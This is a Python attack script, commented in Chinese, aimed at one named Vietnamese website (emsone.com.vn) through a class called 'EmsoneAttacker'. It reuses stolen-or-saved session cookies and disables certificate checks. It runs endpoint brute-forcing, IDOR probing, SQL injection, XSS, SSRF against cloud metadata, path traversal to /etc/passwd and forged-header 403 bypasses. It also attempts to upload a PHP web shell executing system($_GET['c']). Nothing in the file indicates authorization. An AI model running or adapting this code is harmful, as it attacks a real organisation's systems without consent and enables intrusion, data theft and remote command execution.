#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import json
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import urllib3
urllib3.disable_warnings()

class EmsoneAttacker:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.proxies_pool = []
        self.vulnerabilities = []
        self.endpoints = []
        
    def load_session(self):
        """加载登录Session"""
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
            print("[+] Session loaded")
            return True
        except:
            print("[-] No session found, need login first")
            return False
    
    def test_endpoint(self, path, method='GET', data=None):
        """测试端点"""
        url = urljoin(self.base_url, path)
        try:
            if method == 'GET':
                r = self.session.get(url, timeout=5)
            else:
                r = self.session.post(url, data=data, timeout=5)
            
            if r.status_code in [200, 201, 302, 403]:
                return {
                    'url': url,
                    'status': r.status_code,
                    'length': len(r.content),
                    'headers': dict(r.headers),
                    'content': r.text[:1000]
                }
        except:
            pass
        return None
    
    def find_endpoints(self):
        """发现所有端点"""
        print("[*] 端点发现中...")
        
        # 常见路径
        common_paths = [
            "/Account/", "/Admin/", "/api/", "/Api/", "/API/",
            "/admin/", "/administrator/", "/manager/", "/dashboard/",
            "/user/", "/users/", "/profile/", "/settings/",
            "/upload/", "/file/", "/download/", "/export/",
            "/report/", "/data/", "/backup/", "/test/",
            "/dev/", "/staging/", "/debug/", "/config/",
            "/swagger/", "/swagger-ui/", "/api-docs/",
            "/graphql", "/graphiql", "/v1/", "/v2/",
            "/.git/", "/.env", "/.svn/", "/.DS_Store",
            "/phpinfo.php", "/info.php", "/test.php",
            "/web.config", "/application.properties",
            "/robots.txt", "/sitemap.xml", "/.well-known/"
        ]
        
        # API端点
        api_patterns = [
            "/api/users", "/api/admin", "/api/data",
            "/api/export", "/api/upload", "/api/delete",
            "/Account/GetUserInfo", "/Account/ChangePassword",
            "/Account/Logout", "/Account/Profile",
            "/Admin/Users", "/Admin/Settings", "/Admin/Export"
        ]
        
        all_paths = common_paths + api_patterns
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self.test_endpoint, path): path for path in all_paths}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.endpoints.append(result)
                    print(f"[+] Found: {result['url']} [{result['status']}]")
    
    def test_idor(self):
        """测试IDOR"""
        print("[*] IDOR测试中...")
        idor_paths = [
            "/Account/GetUserInfo?id=1",
            "/Account/GetUserInfo?id=2",
            "/api/users/1",
            "/api/users/2",
            "/api/users/0",
            "/api/users/-1",
            "/api/users/999999",
            "/Admin/GetUser?id=1",
            "/Admin/GetUser?id=2"
        ]
        
        for path in idor_paths:
            result = self.test_endpoint(path)
            if result and result['status'] == 200:
                print(f"[!] Potential IDOR: {result['url']}")
                self.vulnerabilities.append({
                    'type': 'IDOR',
                    'url': result['url'],
                    'details': result
                })
    
    def test_sqli(self):
        """SQL注入测试"""
        print("[*] SQL注入测试中...")
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "1' UNION SELECT NULL--",
            "1' AND SLEEP(5)--"
        ]
        
        test_params = [
            "/Account/JLogin?MobileNumber={}&Password=test",
            "/api/search?q={}",
            "/api/users?id={}",
            "/Account/GetUserInfo?id={}"
        ]
        
        for param in test_params:
            for payload in sqli_payloads:
                path = param.format(payload)
                result = self.test_endpoint(path)
                if result:
                    if 'error' in result['content'].lower() or 'sql' in result['content'].lower():
                        print(f"[!] Potential SQLi: {result['url']}")
                        self.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': result['url'],
                            'payload': payload
                        })
    
    def test_xss(self):
        """XSS测试"""
        print("[*] XSS测试中...")
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "'\"><script>alert(1)</script>"
        ]
        
        test_paths = [
            "/api/search?q={}",
            "/Account/GetUserInfo?name={}",
            "/api/comment?text={}"
        ]
        
        for path_template in test_paths:
            for payload in xss_payloads:
                path = path_template.format(payload)
                result = self.test_endpoint(path)
                if result and payload in result['content']:
                    print(f"[!] Potential XSS: {result['url']}")
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'url': result['url'],
                        'payload': payload
                    })
    
    def test_file_upload(self):
        """文件上传测试"""
        print("[*] 文件上传测试中...")
        upload_paths = [
            "/upload", "/api/upload", "/Account/Upload",
            "/file/upload", "/admin/upload"
        ]
        
        test_files = {
            'file': ('test.php', '<?php echo "test"; ?>', 'application/x-php'),
            'image': ('test.jpg', b'\xFF\xD8\xFF\xE0', 'image/jpeg'),
            'shell': ('shell.php', '<?php system($_GET["c"]); ?>', 'application/x-php')
        }
        
        for path in upload_paths:
            url = urljoin(self.base_url, path)
            for name, (filename, content, content_type) in test_files.items():
                try:
                    files = {name: (filename, content, content_type)}
                    r = self.session.post(url, files=files, timeout=5)
                    if r.status_code in [200, 201]:
                        print(f"[!] Upload endpoint: {url}")
                except:
                    pass
    
    def test_ssrf(self):
        """SSRF测试"""
        print("[*] SSRF测试中...")
        ssrf_payloads = [
            "http://127.0.0.1:22",
            "http://localhost/admin",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
            "gopher://127.0.0.1:3306"
        ]
        
        test_paths = [
            "/api/fetch?url={}",
            "/api/proxy?target={}",
            "/Account/Image?url={}"
        ]
        
        for path_template in test_paths:
            for payload in ssrf_payloads:
                path = path_template.format(payload)
                result = self.test_endpoint(path)
                if result:
                    print(f"[!] Potential SSRF: {result['url']}")
    
    def test_auth_bypass(self):
        """认证绕过测试"""
        print("[*] 认证绕过测试中...")
        
        # 403绕过
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Original-URL": "/"},
            {"X-Rewrite-URL": "/"},
            {"Referer": "https://emsone.com.vn/"},
            {"X-Custom-IP-Authorization": "127.0.0.1"}
        ]
        
        admin_paths = [
            "/Admin/", "/admin/", "/administrator/",
            "/api/admin", "/manager/", "/dashboard/"
        ]
        
        for path in admin_paths:
            url = urljoin(self.base_url, path)
            for headers in bypass_headers:
                try:
                    r = self.session.get(url, headers=headers, timeout=5)
                    if r.status_code == 200:
                        print(f"[!] 403 Bypass: {url} with {headers}")
                        self.vulnerabilities.append({
                            'type': '403 Bypass',
                            'url': url,
                            'headers': headers
                        })
                except:
                    pass
    
    def test_path_traversal(self):
        """路径遍历测试"""
        print("[*] 路径遍历测试中...")
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        test_paths = [
            "/api/file?path={}",
            "/download?file={}",
            "/Account/GetFile?name={}"
        ]
        
        for path_template in test_paths:
            for payload in traversal_payloads:
                path = path_template.format(payload)
                result = self.test_endpoint(path)
                if result and ('root:' in result['content'] or 'localhost' in result['content']):
                    print(f"[!] Path Traversal: {result['url']}")
    
    def scan_all(self):
        """全扫描"""
        if not self.load_session():
            print("[-] Need login first")
            return
        
        self.find_endpoints()
        self.test_idor()
        self.test_sqli()
        self.test_xss()
        self.test_file_upload()
        self.test_ssrf()
        self.test_auth_bypass()
        self.test_path_traversal()
        
        # 保存结果
        with open('vulnerabilities.json', 'w') as f:
            json.dump(self.vulnerabilities, f, indent=2)
        
        with open('endpoints.json', 'w') as f:
            json.dump(self.endpoints, f, indent=2)
        
        print(f"\n[+] 发现 {len(self.vulnerabilities)} 个潜在漏洞")
        print(f"[+] 发现 {len(self.endpoints)} 个端点")

if __name__ == "__main__":
    attacker = EmsoneAttacker()
    attacker.scan_all()